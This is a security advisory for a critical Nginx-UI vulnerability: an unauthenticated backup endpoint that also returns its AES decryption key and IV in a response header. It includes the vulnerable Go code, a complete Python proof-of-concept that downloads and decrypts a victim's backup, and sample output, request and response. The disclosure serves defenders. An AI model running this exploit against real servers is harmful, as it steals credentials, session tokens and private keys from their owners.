# Nginx-UI Vulnerable to Unauthenticated Backup Download with Encryption Key Disclosure

**GHSA**: GHSA-g9w5-qffc-6762 | **CVE**: CVE-2026-27944 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-306, CWE-311

**Affected Packages**:
- **github.com/0xJacky/Nginx-UI** (go): < 2.3.3

## Description

## Summary

The `/api/backup` endpoint is accessible without authentication and discloses the encryption keys required to decrypt the backup in the `X-Backup-Security` response header. This allows an unauthenticated attacker to download a full system backup containing sensitive data (user credentials, session tokens, SSL private keys, Nginx configurations) and decrypt it immediately.

## Vulnerability Details

| Field | Value |
|-------|-------|
| CWE | CWE-306: Missing Authentication for Critical Function + CWE-311: Missing Encryption of Sensitive Data |
| Affected File | `api/backup/router.go` |
| Affected Function | `CreateBackup` (lines 8-11 in router, implementation in `api/backup/backup.go:13-38`) |
| Secondary File | `internal/backup/backup.go` |
| CVSS 3.1 | 9.8 (Critical) |
| CVSS Vector | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |

## Root Cause

The vulnerability exists due to two critical security flaws:

### 1. Missing Authentication on /api/backup Endpoint

In `api/backup/router.go:9`, the backup endpoint is registered without any authentication middleware:

```go
func InitRouter(r *gin.RouterGroup) {
	r.GET("/backup", CreateBackup)  // No authentication required
	r.POST("/restore", middleware.EncryptedForm(), RestoreBackup)  // Has middleware
}
```

For comparison, the restore endpoint correctly uses middleware, while the backup endpoint is completely open.

### 2. Encryption Keys Disclosed in HTTP Response Headers

In `api/backup/backup.go:22-33`, the AES-256 encryption key and IV are sent in plaintext via the `X-Backup-Security` header:

```go
func CreateBackup(c *gin.Context) {
	result, err := backup.Backup()
	if err != nil {
		cosy.ErrHandler(c, err)
		return
	}

	// Concatenate Key and IV
	securityToken := result.AESKey + ":" + result.AESIv  // Keys sent in header

	// ...
	c.Header("X-Backup-Security", securityToken) // Keys exposed to anyone

	// Send file content
	http.ServeContent(c.Writer, c.Request, fileName, modTime, reader)
}
```

The encryption keys are Base64-encoded AES-256 key (32 bytes) and IV (16 bytes), formatted as `key:iv`.

### 3. Backup Contents

The backup archive (created in `internal/backup/backup.go`) contains:

```go
// Files included in backup:
- nginx-ui.zip (encrypted)
  └── database.db          // User credentials, session tokens
  └── app.ini              // Configuration with secrets
  └── server.key/cert      // SSL certificates

- nginx.zip (encrypted)
  └── nginx.conf           // Nginx configuration
  └── sites-enabled/*      // Virtual host configs
  └── ssl/*                // SSL private keys

- hash_info.txt (encrypted)
  └── SHA-256 hashes for integrity verification
```

All files are encrypted with AES-256-CBC, but the keys are disclosed in the response.

## Proof of Concept

### Python script

```python
#!/usr/bin/env python3

"""
POC: Unauthenticated Backup Download + Key Disclosure via X-Backup-Security

Usage:
  python poc.py --target http://127.0.0.1:9000 --out backup.bin --decrypt
"""

import argparse
import base64
import os
import sys
import urllib.parse
import urllib.request
import zipfile
from io import BytesIO

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
except ImportError:
    print("Error: pycryptodome required for decryption")
    print("Install with: pip install pycryptodome")
    sys.exit(1)


def _parse_keys(hdr_val: str):
    """
    Parse X-Backup-Security header format: "base64_key:base64_iv"
    Example: e5eWtUkqVEIixQjh253kPYe3cpzdasxiYTbOFHm9CJ4=:7XdVSRcgYfWf7C/J0IS8Cg==
    """
    v = (hdr_val or "").strip()

    # Format is: key:iv (both base64 encoded)
    if ":" in v:
        parts = v.split(":", 1)
        if len(parts) == 2:
            return parts[0].strip(), parts[1].strip()

    return None, None


def decrypt_aes_cbc(encrypted_data: bytes, key_b64: str, iv_b64: str) -> bytes:
    """Decrypt using AES-256-CBC with PKCS#7 padding"""
    key = base64.b64decode(key_b64)
    iv = base64.b64decode(iv_b64)

    if len(key) != 32:
        raise ValueError(f"Invalid key length: {len(key)} (expected 32 bytes for AES-256)")
    if len(iv) != 16:
        raise ValueError(f"Invalid IV length: {len(iv)} (expected 16 bytes)")

    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted_data)
    return unpad(decrypted, AES.block_size)


def extract_backup(encrypted_zip_path: str, key_b64: str, iv_b64: str, output_dir: str):
    """Extract and decrypt the backup archive"""
    print(f"\n[*] Extracting encrypted backup to {output_dir}")

    os.makedirs(output_dir, exist_ok=True)

    # Extract the main ZIP (contains encrypted files)
    with zipfile.ZipFile(encrypted_zip_path, 'r') as main_zip:
        print(f"[*] Main archive contains: {main_zip.namelist()}")
        main_zip.extractall(output_dir)

    # Decrypt each file
    encrypted_files = ["hash_info.txt", "nginx-ui.zip", "nginx.zip"]

    for filename in encrypted_files:
        filepath = os.path.join(output_dir, filename)
        if not os.path.exists(filepath):
            print(f"[!] Warning: {filename} not found")
            continue

        print(f"[*] Decrypting {filename}...")

        with open(filepath, "rb") as f:
            encrypted = f.read()

        try:
            decrypted = decrypt_aes_cbc(encrypted, key_b64, iv_b64)

            # Write decrypted file
            decrypted_path = filepath.replace(".zip", "_decrypted.zip") if filename.endswith(".zip") else filepath + ".decrypted"
            with open(decrypted_path, "wb") as f:
                f.write(decrypted)

            print(f"    → Saved to {decrypted_path} ({len(decrypted)} bytes)")

            # If it's a ZIP, extract it
            if filename.endswith(".zip"):
                extract_dir = os.path.join(output_dir, filename.replace(".zip", ""))
                os.makedirs(extract_dir, exist_ok=True)
                with zipfile.ZipFile(BytesIO(decrypted), 'r') as inner_zip:
                    inner_zip.extractall(extract_dir)
                    print(f"    → Extracted {len(inner_zip.namelist())} files to {extract_dir}")

        except Exception as e:
            print(f"    ✗ Failed to decrypt {filename}: {e}")

    # Show hash info
    hash_info_path = os.path.join(output_dir, "hash_info.txt.decrypted")
    if os.path.exists(hash_info_path):
        print(f"\n[*] Hash info:")
        with open(hash_info_path, "r") as f:
            print(f.read())

def main():
    ap = argparse.ArgumentParser(
        description="Nginx UI - Unauthenticated backup download with key disclosure"
    )
    ap.add_argument("--target", required=True, help="Base URL, e.g. http://host:port")
    ap.add_argument("--out", default="backup.bin", help="Where to save the encrypted backup")
    ap.add_argument("--decrypt", action="store_true", help="Decrypt the backup after download")
    ap.add_argument("--extract-dir", default="backup_extracted", help="Directory to extract decrypted files")

    args = ap.parse_args()

    url = urllib.parse.urljoin(args.target.rstrip("/") + "/", "api/backup")

    # Unauthenticated request to the backup endpoint
    req = urllib.request.Request(url, method="GET")

    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            hdr = resp.headers.get("X-Backup-Security", "")
            key, iv = _parse_keys(hdr)
            data = resp.read()
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP Error {e.code}: {e.reason}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

    with open(args.out, "wb") as f:
        f.write(data)

    # Key/IV disclosure in response header enables decryption of the downloaded backup
    print(f"\nX-Backup-Security: {hdr}")
    print(f"Parsed AES-256 key: {key}")
    print(f"Parsed AES IV    : {iv}")

    if key and iv:
        # Verify key/IV lengths
        try:
            key_bytes = base64.b64decode(key)
            iv_bytes = base64.b64decode(iv)
            print(f"\n[*] Key length: {len(key_bytes)} bytes (AES-256 ✓)")
            print(f"[*] IV length : {len(iv_bytes)} bytes (AES block size ✓)")
        except Exception as e:
            print(f"[!] Error decoding keys: {e}")
            sys.exit(1)

        if args.decrypt:
            try:
                extract_backup(args.out, key, iv, args.extract_dir)

            except Exception as e:
                print(f"\n[!] Decryption failed: {e}")
                import traceback
                traceback.print_exc()
                sys.exit(1)
    else:
        print("\n[!] Failed to parse encryption keys from X-Backup-Security header")
        print(f"    Header value: {hdr}")

if __name__ == "__main__":
    main()
```

```bash
# Download and decrypt backup (no authentication required)
# pip install pycryptodome
python poc.py --target http://victim:9000 --decrypt
```

```
X-Backup-Security: gnfd8BhrjzrxS7yLRoVvK+fyV9tjS50cfUn/RWuYjGA=:+rLZrXK3kbWFRK3qMpB3jw==
Parsed AES-256 key: gnfd8BhrjzrxS7yLRoVvK+fyV9tjS50cfUn/RWuYjGA=
Parsed AES IV    : +rLZrXK3kbWFRK3qMpB3jw==

[*] Key length: 32 bytes (AES-256 âœ“)
[*] IV length : 16 bytes (AES block size âœ“)

[*] Extracting encrypted backup to backup_extracted
[*] Main archive contains: ['hash_info.txt', 'nginx-ui.zip', 'nginx.zip']
[*] Decrypting hash_info.txt...
    â†’ Saved to backup_extracted/hash_info.txt.decrypted (199 bytes)
[*] Decrypting nginx-ui.zip...
    â†’ Saved to backup_extracted/nginx-ui_decrypted.zip (12510 bytes)
    â†’ Extracted 2 files to backup_extracted/nginx-ui
[*] Decrypting nginx.zip...
    â†’ Saved to backup_extracted/nginx_decrypted.zip (5682 bytes)
    â†’ Extracted 17 files to backup_extracted/nginx

[*] Hash info:
nginx-ui_hash: 7c803b9b8791cebfad36977a321431182b22878c3faf8af544d05318ccb83ad5
nginx_hash: 183458949e54794e1295449f0d6c1175bb92c1ee008be671ee9ee759aad73905
timestamp: 20260129-122110
version: 2.3.2
```

### HTTP Request (Raw)

```http
GET /api/backup HTTP/1.1
Host: victim:9000

```

**No authentication required** - this request will succeed and return:
- Encrypted backup as ZIP file
- Encryption keys in `X-Backup-Security` header

### Example Response

```http
HTTP/1.1 200 OK
Content-Type: application/zip
Content-Disposition: attachment; filename=backup-20260129-120000.zip
X-Backup-Security: e5eWtUkqVEIixQjh253kPYe3cpzdasxiYTbOFHm9CJ4=:7XdVSRcgYfWf7C/J0IS8Cg==

[Binary ZIP data]
```

The `X-Backup-Security` header contains:
- **Key**: `e5eWtUkqVEIixQjh253kPYe3cpzdasxiYTbOFHm9CJ4=` (Base64-encoded 32-byte AES-256 key)
- **IV**: `7XdVSRcgYfWf7C/J0IS8Cg==` (Base64-encoded 16-byte IV)

<img width="1430" height="835" alt="screenshot" src="https://github.com/user-attachments/assets/a2e23c48-2272-4276-81de-fc700ff05b17" />

## Resources

- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [CWE-311: Missing Encryption of Sensitive Data](https://cwe.mitre.org/data/definitions/311.html)
- [OWASP: Broken Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication)
- [OWASP: Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure)
- [NIST: Key Management Guidelines](https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final)
